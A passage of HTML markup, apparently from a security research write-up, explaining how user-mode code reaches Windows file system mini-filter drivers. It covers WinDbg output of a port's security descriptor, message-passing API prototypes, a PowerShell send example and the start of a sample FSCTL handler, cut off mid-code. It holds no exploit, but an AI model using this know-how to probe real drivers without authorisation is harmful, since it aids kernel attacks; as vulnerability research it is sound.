class="c7"&gt;&lt;span class="c17"&gt;&amp;nbsp; &amp;nbsp; ObjectHeader: &lt;/span&gt;&lt;span class="c17 c77"&gt;ffffb487447ff890&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;(new version)&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; HandleCount: 1 &amp;nbsp;PointerCount: 4&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; Directory Object: ffff8a8889a2d4e0 &amp;nbsp;Name: CLDMSGPORT&lt;/span&gt;&lt;/p&gt;&lt;p class="c7 c8"&gt;&lt;span class="c12"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c17"&gt;0: kd&amp;gt; dx (((nt!_OBJECT_HEADER*)&lt;/span&gt;&lt;span class="c17 c77"&gt;0xffffb487447ff890&lt;/span&gt;&lt;span class="c12"&gt;)-&amp;gt;SecurityDescriptor &amp;amp; ~0x7)&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c17"&gt;(((nt!_OBJECT_HEADER*)0xffffb487447ff890)-&amp;gt;SecurityDescriptor &amp;amp; ~0x7) : &lt;/span&gt;&lt;span class="c12 c49"&gt;0xffff8a888dccb0a0&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c17"&gt;0: kd&amp;gt; !sd &lt;/span&gt;&lt;span class="c17 c49"&gt;0xffff8a888dccb0a0&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;1&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Revision: 0x1&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Sbz1 &amp;nbsp; &amp;nbsp;: 0x0&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Control : 0x9004&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SE_DACL_PRESENT&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SE_DACL_PROTECTED&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SE_SELF_RELATIVE&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Owner &amp;nbsp; : S-1-5-32-544 (Alias: BUILTIN\Administrators)&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Group &amp;nbsp; : S-1-5-18 (Well Known Group: NT AUTHORITY\SYSTEM)&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: &lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;AclRevision: 0x2&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;Sbz1 &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0x0&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;AclSize &amp;nbsp; &amp;nbsp;: 0x1c&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;AceCount &amp;nbsp; : 0x1&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;Sbz2 &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0x0&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;Ace[0]: -&amp;gt;AceType: ACCESS_ALLOWED_ACE_TYPE&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;Ace[0]: -&amp;gt;AceFlags: 0x0&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;Ace[0]: -&amp;gt;AceSize: 0x14&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;Ace[0]: -&amp;gt;Mask : 0x001f0001&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12 c73"&gt;-&amp;gt;Dacl &amp;nbsp; &amp;nbsp;: -&amp;gt;Ace[0]: -&amp;gt;SID: S-1-5-11 (Well Known Group: NT AUTHORITY\Authenticated Users)&lt;/span&gt;&lt;/p&gt;&lt;p class="c7 c8"&gt;&lt;span class="c12"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;-&amp;gt;Sacl &amp;nbsp; &amp;nbsp;: &amp;nbsp;is NULL&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;To dump the SD you first query for the object address of the filter communication port using the &lt;/span&gt;&lt;span class="c21"&gt;!object&lt;/span&gt;&lt;span&gt;&amp;nbsp;command. From the output you take the address of the &lt;/span&gt;&lt;span class="c21"&gt;OBJECT_HEADER&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure and query the &lt;/span&gt;&lt;span class="c21"&gt;SecurityDescriptor &lt;/span&gt;&lt;span&gt;field. Note you must clear the lower 3 bits of the address to make a valid security descriptor pointer. Finally we can print the security descriptor using the &lt;/span&gt;&lt;span class="c21"&gt;!sd&lt;/span&gt;&lt;span&gt;&amp;nbsp;command. The output shows that the security descriptor grants the &lt;/span&gt;&lt;span class="c21"&gt;Authenticated Users&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;group access to connect to the port.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;With an open handle to the port you can now send and receive messages. The filter manager supports both user to kernel and kernel to user message directions. For the user to kernel messages you call the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows/win32/api/fltuser/nf-fltuser-filtersendmessage"&gt;FilterSendMessage&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;API which sends a raw memory buffer to the filter driver and returns a separate buffer as shown in the following prototype:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.2ecdb1c13e3d0237c1811bddfc9fd48395bd949b"&gt;&lt;/a&gt;&lt;a id="t.16"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;HRESULT FilterSendMessage&lt;/span&gt;&lt;span class="c9 c40"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; HANDLE &amp;nbsp;hPort&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; LPVOID &amp;nbsp;lpInBuffer&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; DWORD &amp;nbsp; dwInBufferSize&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; LPVOID &amp;nbsp;lpOutBuffer&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; DWORD &amp;nbsp; dwOutBufferSize&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c30 c4"&gt;&amp;nbsp; LPDWORD lpBytesReturned&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The message is delivered to the filter driver&amp;rsquo;s message notification callback specified when registering the mini-filter. The callback has the following prototype.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.0de83a2010b3723b476821ce0212872868246ed3"&gt;&lt;/a&gt;&lt;a id="t.17"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c32 c23"&gt;typedef&lt;/span&gt;&lt;span class="c30 c4"&gt;&amp;nbsp;NTSTATUS&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c9"&gt;(*&lt;/span&gt;&lt;span class="c4"&gt;PFLT_MESSAGE_NOTIFY&lt;/span&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9 c40"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; IN PVOID PortCookie&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; IN PVOID InputBuffer OPTIONAL&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; IN ULONG InputBufferLength&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; OUT PVOID OutputBuffer OPTIONAL&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; IN ULONG OutputBufferLength&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c30 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; OUT PULONG ReturnOutputBufferLength&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The handling of the message is similar to a device IO control call. In fact under the hood it&amp;rsquo;s implemented using the device IO control code 0x8801B. As this code &lt;/span&gt;&lt;span&gt;uses&lt;/span&gt;&lt;span&gt;&amp;nbsp;the METHOD_NEITHER method means the &lt;/span&gt;&lt;span class="c21"&gt;InputBuffer &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class="c21"&gt;OutputBuffer &lt;/span&gt;&lt;span&gt;parameters are pointers into user-mode memory. The filter manager does check them before calling the callback with &lt;/span&gt;&lt;span class="c21"&gt;ProbeForRead &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class="c21"&gt;ProbeForWrite &lt;/span&gt;&lt;span class="c1"&gt;calls.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;You can send a message to a filter connection port in PowerShell using the &lt;/span&gt;&lt;span class="c21"&gt;Send-FilterConnectionPort&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;command specifying the data to send and the maximum size of the output buffer.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.494e7a89167f5cca6c46500fad41517ed82c458f"&gt;&lt;/a&gt;&lt;a id="t.18"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Send-FilterConnectionPort&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-Port&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$port&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-Input&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;@(&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;0&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;,&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;1&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;,&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;2&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;,&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;3&lt;/span&gt;&lt;span class="c17 c23"&gt;) &lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-MaximumOutput&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;0x100&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;For the kernel to user messages the user mode application needs to call &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows/win32/api/fltuser/nf-fltuser-filtergetmessage"&gt;FilterGetMessage&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to wait for the filter driver to send a message to user-mode. The kernel sends a message to the waiting user mode application using the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltsendmessage"&gt;FltSendMessage&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;API which has the following prototype.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1d1600d61da7a1cb3cbbf069049ecc8387fcf97f"&gt;&lt;/a&gt;&lt;a id="t.19"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;NTSTATUS FltSendMessage&lt;/span&gt;&lt;span class="c9 c40"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; PFLT_FILTER &amp;nbsp; &amp;nbsp;Filter&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; PFLT_PORT &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;*&lt;/span&gt;&lt;span class="c4"&gt;ClientPort&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; PVOID &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SenderBuffer&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; ULONG &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SenderBufferLength&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; PVOID &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ReplyBuffer&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; PULONG &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ReplyLength&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c30 c4"&gt;&amp;nbsp; PLARGE_INTEGER Timeout&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;If there&amp;rsquo;s currently no waiting user mode process the API can wait a specified timeout until the application called &lt;/span&gt;&lt;span class="c21"&gt;FilterGetMessage&lt;/span&gt;&lt;span&gt;. The returned buffer from &lt;/span&gt;&lt;span class="c21"&gt;FilterGetMessage &lt;/span&gt;&lt;span&gt;contains a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltuserstructures/ns-fltuserstructures-_filter_message_header"&gt;FILTER_MESSAGE_HEADER&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;structure followed by the data. The header contains the size of the reply requested as well as a message ID which is used to correlate any reply to the kernel&amp;rsquo;s message. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;To reply the user-mode application calls the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows/win32/api/fltuser/nf-fltuser-filterreplymessage"&gt;FilterReplyMessage&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. The user-mode application needs to append any data to a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltuserstructures/ns-fltuserstructures-_filter_reply_header"&gt;FILTER_REPLY_HEADER&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure which contains the NT status code of the operation and the correlated message ID. The &lt;/span&gt;&lt;span class="c21"&gt;FltSendMessage &lt;/span&gt;&lt;span&gt;API waits for the user-mode application to call &lt;/span&gt;&lt;span class="c21"&gt;FilterReplyMessage&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the correct ID&lt;/span&gt;&lt;span class="c1"&gt;, and returns a buffer to the kernel-mode code. The message notification callback is not involved when using kernel to user-mode calls.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.2s8hdhdlvy2k"&gt;&lt;span class="c5"&gt;Filter Callbacks&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Typically the purpose of the mini-filter callbacks would be to inspect or modify pre-existing IO requests to a file system. Therefore one way of getting untrusted data to the driver is based on how it handles IO requests. &amp;nbsp;However, it&amp;rsquo;s possible to add additional functionality on top of an existing file system to allow for communication between user mode and kernel mode. The filter driver can add a callback for device or file system IO control code requests and check and handle its own control codes. This allows the filter to implement additional functionality on existing files. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The following is a simple example of adding a &lt;/span&gt;&lt;span class="c21"&gt;FSCTL_REVERSE_BYTES&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;FS IO control code to an existing file system. This FSCTL is not really supported by any filesystem.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.2b609a381684d9d2c5a2d9833c80ba9125a7a23c"&gt;&lt;/a&gt;&lt;a id="t.20"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c19"&gt;&lt;span class="c4 c40 c66"&gt;#define FSCTL_REVERSE_BYTES CTL_CODE(FILE_DEVICE_FILESYSTEM, &lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4 c40 c66"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0x801, &lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4 c40 c66"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;METHOD_BUFFERED, &lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4 c40 c66"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;FILE_ANY_ACCESS)&lt;/span&gt;&lt;/p&gt;&lt;p class="c19 c8"&gt;&lt;span class="c30 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c30 c4"&gt;FLT_PREOP_CALLBACK_STATUS&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;PreFsControlOperation&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PFLT_CALLBACK_DATA Data&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PCFLT_RELATED_OBJECTS FltObjects&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PVOID&lt;/span&gt;&lt;span class="c9"&gt;*&lt;/span&gt;&lt;span class="c30 c4"&gt;&amp;nbsp;CompletionContext&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PFLT_PARAMETERS ps &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;Iopb&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;Parameters&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;if&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;ps&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;DeviceIoControl&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Common&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;IoControlCode &lt;/span&gt;&lt;span class="c9"&gt;!=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FSCTL_REVERSE_BYTES&lt;/span&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;return&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FLT_PREOP_SUCCESS_NO_CALLBACK&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c19 c8"&gt;&lt;span class="c30 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c4 c54"&gt;char&lt;/span&gt;&lt;span class="c9"&gt;*&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;buffer &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;ps&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;DeviceIoControl&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Buffered&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;SystemBuffer&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; ULONG length &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;min&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;ps&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;DeviceIoControl&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Buffered&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;InputBufferLength&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; 